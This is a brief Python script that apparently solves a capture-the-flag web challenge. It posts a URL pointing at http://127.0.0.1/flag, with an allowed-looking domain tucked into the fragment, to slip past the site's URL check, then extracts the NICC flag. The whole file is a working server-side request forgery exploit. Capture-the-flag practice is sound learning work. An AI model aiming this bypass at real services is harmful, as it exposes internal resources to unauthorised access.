#!/usr/bin/env python3
import re
import requests

data = {'url': 'http://127.0.0.1/flag#blogcryptidreal666.org'}

response = requests.post('http://paranormal-picture.niccgetsspooky.xyz/', data)

print(re.search('NICC{.+}', response.text).group(0))
